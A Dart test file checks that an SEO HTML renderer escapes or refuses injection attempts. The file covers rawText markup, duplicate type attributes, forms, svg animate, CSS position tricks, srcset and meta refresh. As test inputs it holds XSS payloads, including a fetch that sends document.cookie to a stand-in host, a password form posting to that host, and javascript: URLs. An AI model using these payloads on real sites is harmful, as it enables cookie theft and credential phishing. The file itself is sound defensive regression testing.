import 'package:esen_seo/server.dart';
import 'package:esen_seo/src/renderer/tag_policy.dart';
import 'package:flutter_test/flutter_test.dart';

/// Every case here was a working bypass of the renderer's safety net at
/// some point. They are pinned so the net cannot quietly develop the
/// same hole twice.
void main() {
  const body = HtmlRenderer();
  const head = HtmlRenderer.head();

  group('rawText is not an HTML sink', () {
    test('markup in rawText on an ordinary tag is escaped', () {
      // Das war die schwerste Lücke: rawText ging wörtlich raus und
      // umging damit Tag-Policy, Attribut-Policy und Escaping auf
      // einmal — auf jedem Element, nicht nur auf script.
      final html = body.render([
        SeoNode(tag: 'div', rawText: '<img src=x onerror=alert(1)>'),
      ]);
      expect(html, isNot(contains('<img')));
      expect(html, contains('&lt;img'));
    });

    test('a textarea cannot be closed from rawText', () {
      final html = body.render([
        SeoNode(tag: 'p', rawText: '</p><img src=x onerror=alert(2)>'),
      ]);
      expect('</p>'.allMatches(html), hasLength(1));
      expect(html, isNot(contains('<img')));
    });

    test('JSON-LD keeps its payload but cannot start markup', () {
      final html = body.render([
        SeoNode(
          tag: 'script',
          attributes: {'type': 'application/ld+json'},
          rawText: '{"a":"<!--<script>x</script>"}',
        ),
      ]);
      // Genau ein öffnendes und ein schließendes script-Element:
      expect('<script'.allMatches(html), hasLength(1));
      expect('</script>'.allMatches(html), hasLength(1));
      expect(html, isNot(contains('<!--')));
      expect(html, contains(r'<'));
    });

    test('children of a JSON-LD node do not close it early', () {
      final html = body.render([
        SeoNode(
          tag: 'script',
          attributes: {'type': 'application/ld+json'},
          rawText: '{}',
          children: [SeoNode(tag: 'p', text: 'raus hier')],
        ),
      ]);
      expect(html, isNot(contains('<p>')));
      expect('</script>'.allMatches(html), hasLength(1));
    });
  });

  group('the JSON-LD exception cannot be borrowed', () {
    test('a second type key in different case does not smuggle a script', () {
      // HTML behält bei doppelten Attributen das ERSTE — die Prüfung
      // sah aber das zweite an.
      final attributes = <String, String>{};
      attributes['Type'] = 'text/javascript';
      attributes['type'] = 'application/ld+json';
      final html = body.renderNode(SeoNode(
        tag: 'script',
        attributes: attributes,
        rawText: "fetch('//evil.tld/?c='+document.cookie)",
      ));
      expect('type='.allMatches(html), hasLength(1));
      expect(html, isNot(contains('text/javascript')));
    });

    test('a plain script is still refused', () {
      expect(
        body.renderNode(SeoNode(tag: 'script', text: 'alert(1)')),
        '<div>alert(1)</div>',
      );
    });
  });

  group('elements that swallow the document', () {
    test('plaintext and friends never reach the output', () {
      for (final tag in [
        'plaintext',
        'xmp',
        'noembed',
        'noframes',
        'listing'
      ]) {
        expect(
          body.renderNode(SeoNode(tag: tag, text: 'x')),
          '<div>x</div>',
          reason: 'tag: $tag',
        );
      }
    });

    test('forms and inputs are refused', () {
      final html = body.render([
        SeoNode(tag: 'form', attributes: {
          'action': '//evil.tld/steal'
        }, children: [
          SeoNode(tag: 'input', attributes: {'name': 'password'}),
        ]),
      ]);
      expect(html, isNot(contains('<form')));
      expect(html, isNot(contains('<input')));
      expect(html, isNot(contains('evil.tld')));
    });

    test('svg cannot animate an href into a script URL', () {
      final html = body.render([
        SeoNode(tag: 'svg', children: [
          SeoNode(tag: 'a', attributes: {
            'href': '/ok'
          }, children: [
            SeoNode(tag: 'animate', attributes: {
              'attributename': 'href',
              'values': 'javascript:alert(1)',
            }),
          ]),
        ]),
      ]);
      expect(html, isNot(contains('<svg')));
      expect(html, isNot(contains('animate')));
      expect(html, isNot(contains('javascript:')));
    });
  });

  group('value-level guards', () {
    test('a CSS comment does not hide position:fixed', () {
      expect(
        isAllowedSeoAttribute('style', 'position:/**/fixed;inset:0'),
        isFalse,
      );
    });

    test('a CSS escape is refused rather than guessed at', () {
      expect(isAllowedSeoAttribute('style', r'position:\66 ixed;inset:0'),
          isFalse);
    });

    test('position is an allow list, not a list of banned words', () {
      // -webkit-sticky wirkt in Safari, und hinter var(--x) kann alles
      // stecken — beide würden eine Wortsperre passieren.
      for (final css in [
        'position:-webkit-sticky;top:0',
        '--p:fixed;position:var(--p);inset:0',
        'position:STICKY',
        'POSITION : fixed',
      ]) {
        expect(
          isAllowedSeoAttribute('style', css),
          isFalse,
          reason: 'accepted: $css',
        );
      }
      // Was den Container nicht verlassen kann, bleibt erlaubt:
      for (final css in ['position:relative', 'position:absolute;top:0']) {
        expect(
          isAllowedSeoAttribute('style', css),
          isTrue,
          reason: 'refused: $css',
        );
      }
    });

    test('every srcset candidate is checked, not just the first', () {
      expect(
        isAllowedSeoAttribute('srcset', 'ok.png 1x, javascript:alert(1) 2x'),
        isFalse,
      );
      expect(
        isAllowedSeoAttribute('srcset', 'a.png 1x, b.png 2x'),
        isTrue,
      );
    });

    test('ping and the other request-firing attributes are covered', () {
      for (final name in ['ping', 'background', 'longdesc', 'srcdoc']) {
        expect(
          isAllowedSeoAttribute(name, 'javascript:alert(1)'),
          isFalse,
          reason: 'attribute: $name',
        );
      }
    });
  });

  group('the head is not a free-for-all', () {
    test('a meta refresh cannot redirect the page', () {
      final html = head.render([
        SeoNode(tag: 'meta', attributes: {
          'http-equiv': 'refresh',
          'content': '0;url=https://evil.tld',
        }),
      ]);
      expect(html, isNot(contains('http-equiv')));
    });

    test('legitimate head tags are untouched', () {
      final html = head.render([
        SeoNode(tag: 'title', text: 'Titel'),
        SeoNode(
            tag: 'meta', attributes: {'name': 'description', 'content': 'D'}),
        SeoNode(tag: 'link', attributes: {'rel': 'canonical', 'href': '/'}),
      ]);
      expect(html, contains('<title>Titel</title>'));
      expect(html, contains('<meta name="description" content="D"/>'));
      expect(html, contains('<link rel="canonical" href="/"/>'));
    });
  });
}
